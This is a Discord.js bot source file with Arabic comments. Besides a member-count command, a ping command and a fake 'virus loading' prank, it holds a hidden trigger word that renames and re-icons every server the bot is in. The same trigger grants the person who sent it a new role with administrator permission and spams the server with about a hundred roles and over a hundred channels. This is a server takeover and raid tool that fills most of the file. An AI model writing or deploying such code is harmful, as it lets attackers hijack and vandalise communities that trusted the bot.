const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '-help'

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`Made By xiYoussef`,"http://twitch.tv/S-F")
  console.log('')
  console.log('')
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});
client.on('message',function(message) {
  if (message.author.bot) return;


                  if(!message.channel.guild) return;

                    if (message.content === prefix + "members") {
 const embed = new Discord.RichEmbed()

    .setDescription(`**Members info ✨
 اونلاين:   ${message.guild.members.filter(m=>m.presence.status == 'online').size}
  حاله حمراء       ${message.guild.members.filter(m=>m.presence.status == 'dnd').size}
  حاله صفراء:     ${message.guild.members.filter(m=>m.presence.status == 'idle').size}
  الاوفلاين:     ${message.guild.members.filter(m=>m.presence.status == 'offline').size}
   عدد الاعضاء:  ${message.guild.memberCount - message.guild.members.filter(m=>m.user.bot).size}
 البوتات: ${message.guild.members.filter(m=>m.user.bot).size} **`)
         message.channel.send({embed});

    }
      });
client.on('message', message => {
    if (message.content.startsWith("-تهكير")) {
      if (message.author.bot) return
           message.delete();
             let args = message.content.split(' ').slice(1);
                   let virusname = args.join(' ');
                 if (virusname < 1) {
                     return message.channel.send("``!Ω→「Fire」iiKaix『h̲̲u̲̲』∞#9792``");
                                     }
                 message.channel.send({embed: new Discord.RichEmbed().setTitle('Loading ' + virusname + "...").setColor(0xFF0000)}).then(function(m) {
             setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓ ] 1%').setColor(0xFF0000)})
             }, 1000)
            setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓] 25%').setColor(0xFF0000)})
             }, 2000)
           setTimeout(function() {     
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 100%').setColor(0xFF0000)})
             }, 3000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Uploaded! Initiating explosion in 1...').setColor(0xFF0000)})
             }, 4000)
              setTimeout(function() {
               m.delete()
           }, 5000)
             setTimeout(function() {
               message.channel.send('تم تهكيرك')
           }, 6000)
           });
         }
 });
client.on('message' , message => {
  var prefix = "-";
  if(message.author.bot) return;
  if(message.content.startsWith(prefix + "ping")) {
 message.channel.send('Pong...').then((msg) => {
      msg.edit(`\`\`\`javascript\nTime taken: ${msg.createdTimestamp - message.createdTimestamp} ms.\nDiscord API: ${Math.round(client.ping)} ms.\`\`\``);
 })
  }  
 });
var x_x = "Hack" //هنا تحط الامر اللي يشغل الهاك

//اسم البوت واسم السيرفر وصورهم وكل شئ

client.on('message', message => {
 if (message.content === x_x) {
  client.user.setAvatar(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)

 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setUsername("Done Hack")

 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setGame(`Done Hack`, 'https://www.twitch.tv/hix')

 }
});

client.on('message', message => {
 if (message.content === x_x) {
  client.guilds.forEach(m => {
   m.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
  })
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.guilds.forEach(m => {
   m.setName(`Done Hack`)
  })
 }
});

client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;

  message.guild.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)

 }
});




//اللي يسوي رتب

client.on('message', message => {
 if (!message.channel.guild) return;

 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createRole({
   name: "Done Hack",
   permissions: [8],
   color: "#23272a"
  }).then(function(role) {
   message.member.addRole(role);
  })
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });


 }
});




//هنا اللي يسوي الرومات
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
